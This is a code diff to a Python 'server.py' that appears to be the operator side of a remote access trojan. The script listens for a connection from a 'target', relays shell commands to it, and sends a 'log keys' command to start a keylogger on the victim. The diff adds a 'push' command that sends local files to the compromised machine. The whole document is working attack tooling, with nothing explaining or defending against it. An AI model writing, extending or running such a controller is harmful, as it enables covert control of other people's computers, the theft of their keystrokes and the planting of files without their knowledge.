@@ -1,5 +1,5 @@
 import socket as st
-from os import system
+import os
 from sys import argv,exit,stdout
 
 try:
@@ -13,7 +13,7 @@ try:
     con,addr = sock.accept()
     try:
         if con:
-            system('clear')
+            os.system('clear')
             print('[*] Connection established to the target')
             while True:
                 get_path = con.recv(1024).decode()
@@ -23,7 +23,7 @@ try:
 
                 elif cmd == 'clear':
                     con.send(cmd.encode())
-                    system('clear')
+                    os.system('clear')
                     get_path = None
                     continue
 
@@ -42,6 +42,18 @@ try:
                     except Exception as e:
                         print(e)
 
+                elif cmd.startswith('push'):
+                    con.send(cmd.encode())
+                    split_cmd = cmd.split()
+                    file_name = split_cmd[1]
+
+                    if os.path.exists(file_name):
+                        file = open(file_name,'r')
+                        getcontent = file.read()
+                        con.send(getcontent.encode())
+                    else:
+                        print(f'The file \'{file_name}\' doesn\'t exist')
+
                 elif cmd == 'log keys':
                     con.send(cmd.encode())
                     print('start keylogger...')
@@ -55,7 +67,7 @@ try:
                     continue
                 elif cmd == 'quite' or cmd == 'exit':
                     con.close()
-                    system('clear')
+                    os.system('clear')
                     sock.close()
                     print('server and target disconnected with ip : {}'.format(addr[0]))
                     exit(1)
@@ -75,7 +87,7 @@ try:
 
 except Exception as error:
     if not error:
-        system('clear')
+        os.system('clear')
         print('something is missing....',end='\n')
         print('<usage> : python3 server.py <target_ipaddress> <port>')
         exit()
